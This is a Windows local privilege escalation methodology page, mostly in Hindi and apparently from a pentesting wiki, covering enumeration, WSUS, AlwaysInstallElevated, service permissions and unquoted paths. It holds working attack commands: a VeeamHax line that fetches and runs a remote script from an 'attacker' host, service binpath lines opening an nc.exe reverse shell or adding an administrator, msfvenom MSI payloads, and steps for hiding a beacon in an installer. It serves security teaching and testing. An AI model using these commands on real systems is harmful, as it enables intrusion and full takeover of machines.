# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो आगे बढ़ने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या होते हैं तो आगे बढ़ने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में ऐसी अलग-अलग चीज़ें हैं जो आपको सिस्टम enumerate करने से रोक सकती हैं, executables चलाने से रोक सकती हैं या यहां तक कि आपकी गतिविधियों को detect कर सकती हैं। आपको निम्न पृष्ठ पढ़ना चाहिए और इन सभी defenses mechanisms को privilege escalation enumeration शुरू करने से पहले सूचीबद्ध करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के माध्यम से लॉन्च किए गए UIAccess processes का दुरुपयोग करके, जब AppInfo secure-path checks bypass होते हैं, तो बिना prompts के High IL तक पहुँचा जा सकता है। समर्पित UIAccess/Admin Protection bypass workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System Info

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability तो नहीं है (लागू किए गए patches भी जाँचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### संस्करण Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो एक Windows environment द्वारा प्रस्तुत **massive attack surface** को दिखाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson embedded)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github रिपोज़ of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### पर्यावरण

क्या कोई credential/Juicy जानकारी env variables में सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell ट्रांसक्रिप्ट फ़ाइलें

आप इसे चालू करने का तरीका इस लिंक पर सीख सकते हैं: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादनों का विवरण रिकॉर्ड किया जाता है, जिसमें निष्पादित कमांड, कमांड इनवोकेशंस और स्क्रिप्ट के हिस्से शामिल होते हैं। हालाँकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम शायद कैप्चर न हों।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें और **"Module Logging"** को चुनें न कि **"Powershell Transcription"**।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से अंतिम 15 events देखने के लिए आप execute कर सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और पूर्ण सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का हर ब्लॉक उसके चलने के समय दस्तावेज़ित हो। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल संरक्षित करती है, जो फॉरेंसिक्स और दुर्भावनापूर्ण व्यवहार के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों को दस्तावेज़ित करके, प्रक्रिया के बारे में विस्तृत जानकारी प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग इवेंट्स Windows Event Viewer में निम्न पथ पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
अंतिम 20 इवेंट्स देखने के लिए आप निम्न का उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट http**S** के बजाय http के माध्यम से अनुरोध किए जाते हैं तो आप सिस्टम समझौता कर सकते हैं।

आप यह जांचना शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग करता है या नहीं, cmd में निम्नलिखित चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी एक जैसा उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` के मान `1` के बराबर हैं।

तो, **it is exploitable.** यदि अंतिम registry का मान `0` के बराबर है, तो WSUS एंट्री को अनदेखा कर दिया जाएगा।

इन कमज़ोरियों का फायदा उठाने के लिए आप ऐसे टूल्स का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ये MiTM weaponized exploits स्क्रिप्ट्स हैं जो non-SSL WSUS ट्रैफ़िक में 'fake' updates इंजेक्ट करती हैं।

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> यदि हमारे पास अपने local user proxy को modify करने की क्षमता है, और Windows Updates Internet Explorer की settings में configured proxy का उपयोग करता है, तो हम स्थानीय रूप से [PyWSUS](https://github.com/GoSecure/pywsus) चला कर अपनी खुद की ट्रैफ़िक को intercept कर सकते हैं और अपने asset पर elevated user के रूप में कोड चला सकते हैं।
>
> इसके अतिरिक्त, चूंकि WSUS service current user की settings का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate जनरेट करते हैं और इसे current user के certificate store में जोड़ते हैं, तो हम HTTP और HTTPS दोनों WSUS ट्रैफ़िक को intercept कर पाएंगे। WSUS प्रमाणपत्र के लिए trust-on-first-use प्रकार के validation को लागू करने के लिए किसी HSTS-जैसे mechanism का उपयोग नहीं करता। यदि प्रस्तुत प्रमाणपत्र user द्वारा trusted है और उस पर सही hostname है, तो service इसे स्वीकार कर लेगी।

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents एक localhost IPC surface और एक privileged update channel expose करते हैं। यदि enrollment को attacker server की ओर मजबूर किया जा सके और updater एक rogue root CA या कमजोर signer checks पर भरोसा करता हो, तो एक local user एक malicious MSI डिलीवर कर सकता है जिसे SYSTEM service इंस्टॉल कर देता है। See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: listener और version की पुष्टि करें, उदाहरण के लिए, `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: एक PoC जैसे `VeeamHax.exe` आवश्यक Veeam DLLs के साथ उसी डायरेक्टरी में रखें, फिर local socket पर SYSTEM payload ट्रिगर करें:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
यह सर्विस SYSTEM के रूप में कमांड को निष्पादित करती है।

## KrbRelayUp

Windows **domain** परिवेशों में विशिष्ट परिस्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन परिस्थितियों में वे वातावरण शामिल हैं जहाँ **LDAP signing is not enforced,** उपयोगकर्ताओं के पास self-rights होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, और उपयोगकर्ताओं के पास domain के भीतर कंप्यूटर बनाने की क्षमता होती है। ध्यान देने वाली बात यह है कि ये **आवश्यकताएँ** सामान्य **default settings** के साथ पूरी होती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

अधिक जानकारी और हमले के फ़्लो के बारे में देखें: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 रजिस्ट्री एंट्रियाँ **enabled** (value **0x1**) हैं, तो किसी भी अधिकार वाले उपयोगकर्ता NT AUTHORITY\\**SYSTEM** के रूप में `*.msi` फ़ाइलें **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter session है, तो आप इस तकनीक को module **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

PowerUP से `Write-UserAddMSI` कमांड का उपयोग करके वर्तमान निर्देशिका में एक Windows MSI बाइनरी बनाकर privileges बढ़ाएँ। यह script एक precompiled MSI installer लिखता है जो user/group addition के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
बस बनाए गए binary को चलाकर escalate privileges करें।

### MSI Wrapper

इस ट्यूटोरियल को पढ़ें ताकि आप इस tools का उपयोग करके MSI Wrapper बनाना सीख सकें। ध्यान दें कि आप एक "**.bat**" फ़ाइल को wrap कर सकते हैं अगर आप सिर्फ **command lines** को **execute** करना चाहते हैं


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike या Metasploit का उपयोग करके `C:\privesc\beacon.exe` में एक **new Windows EXE TCP payload** जनरेट करें
- **Visual Studio** खोलें, **Create a new project** चुनें और search बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) पर न पहुँचें। **Add** पर क्लिक करें और आपने जो Beacon payload अभी जनरेट किया था उसे चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो इंस्टॉल किए गए ऐप को अधिक वैध दिखा सकते हैं।
- प्रोजेक्ट पर राइट‑क्लिक करें और चुनें **View > Custom Actions**।
- **Install** पर राइट‑क्लिक करें और चुनें **Add Custom Action**।
- **Application Folder** पर डबल‑क्लिक करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे यह सुनिश्चित होगा कि जैसे ही इंस्टॉलर चलाया जाए beacon payload execute हो जाए।
- **Custom Action Properties** के तहत, **Run64Bit** को **True** में बदलें।
- अंत में, **build** करें।
- यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

malicious `.msi` फ़ाइल की **installation** को बैकग्राउंड में चलाने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability को exploit करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना रोचक है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** को डोमेन से जुड़े कंप्यूटरों पर **local Administrator passwords के प्रबंधन** के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड **unique, randomised, and regularly updated** हो। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहित किए जाते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त permissions दिए गए हों, ताकि वे अधिकृत होने पर local admin passwords देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अनविश्वसनीय प्रक्रियाओं द्वारा इसकी **read its memory** या inject code करने के प्रयासों को **block** किया जा सके, जिससे सिस्टम और सुरक्षित बनता है।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहित credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है।| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता के **logon data** को किसी registered security package द्वारा प्रमाणित किया जाता है, तो सामान्यतः उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूहों की सूची बनाना

आपको यह जांचना चाहिए कि जिन समूहों के आप सदस्य हैं उनमें कोई रोचक permissions हैं या नहीं
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

यदि आप **किसी विशेषाधिकार समूह के सदस्य हैं तो आप विशेषाधिकार बढ़ाने में सक्षम हो सकते हैं**। विशेषाधिकार समूहों और इन्हें दुरुपयोग करके विशेषाधिकार बढ़ाने के तरीकों के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### टोकन हेरफेर

**और अधिक जानें** कि एक **token** क्या है इस पेज पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पेज देखें ताकि आप **interesting tokens के बारे में जानें** और इन्हें दुरुपयोग कैसे करें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग इन किए हुए उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डरों
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Password नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रक्रियाएँ

### फाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया की कमांड लाइन के भीतर पासवर्ड के लिए जाँच करें**.\
जाँचें कि क्या आप **overwrite some binary running** कर सकते हैं या क्या आपके पास binary folder की write permissions हैं ताकि आप संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठा सकें:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**प्रोसेस बाइनरीज़ के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों के permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके किसी चल रहे प्रोसेस की memory dump बना सकते हैं। FTP जैसी सेवाओं के पास **credentials in clear text in memory** होते हैं; memory को dump करके उन credentials को पढ़ने का प्रयास करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चल रही Applications उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकती हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" के लिए खोज करें, फिर "Click to open Command Prompt" पर क्लिक करें

## Services

Service Triggers Windows को एक service शुरू करने की अनुमति देते हैं जब कुछ शर्तें पूरी होती हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर privileged services को उनके triggers ट्रिगर करके शुरू कर सकते हैं। enumeration और activation techniques के लिए यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

सर्विसेज़ की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
प्रत्येक service के लिए आवश्यक privilege level जांचने के लिए _Sysinternals_ का binary **accesschk** रखना सुझाया जाता है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
सुझाव दिया जाता है कि जाँच करें कि "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं या नहीं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है._\
_यह सेवा शुरू नहीं की जा सकती, या तो क्योंकि यह अक्षम है या क्योंकि इसके साथ कोई सक्षम डिवाइस सम्बंधित नहीं है._

आप इसे निम्नलिखित का उपयोग करके सक्षम कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**इस समस्या का एक और वैकल्पिक उपाय** निम्नलिखित चलाना है:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पाथ बदलें**

उस स्थिति में जहाँ "Authenticated users" समूह के पास किसी सर्विस पर **SERVICE_ALL_ACCESS** है, सर्विस के executable binary को संशोधित करना संभव है। **sc** को संशोधित और execute करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges विभिन्न permissions के माध्यम से escalate किए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: service binary की reconfiguration की अनुमति देता है।
- **WRITE_DAC**: permission reconfiguration को सक्षम करता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership प्राप्त करने और permission reconfiguration करने की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता का अधिकार देता है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता का अधिकार भी देता है।

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**यह जांचें कि आप उस binary को modify कर सकते हैं जो किसी service द्वारा execute की जाती है** या क्या आपके पास उस folder पर **write permissions** हैं जहां binary स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप किसी service द्वारा execute किए जाने वाले हर binary को **wmic** का उपयोग करके प्राप्त कर सकते हैं (not in system32) और अपनी permissions **icacls** का उपयोग करके चेक कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry की अनुमतियाँ बदलना

आपको यह जाँचना चाहिए कि क्या आप किसी भी service registry को संशोधित कर सकते हैं.\
आप किसी service **registry** पर अपनी **अनुमतियाँ** **जाँच** करने के लिए:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांच करना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` अनुमतियाँ हैं। यदि हाँ, तो सर्विस द्वारा निष्पादित बाइनरी को बदला जा सकता है।

निष्पादित बाइनरी के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है तो इसका मतलब है कि **आप इस registry से sub registries बना सकते हैं**। Windows services के मामले में यह **arbitrary code execute करने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes में नहीं है, तो Windows स्पेस से पहले के हर ending को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्नलिखित execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
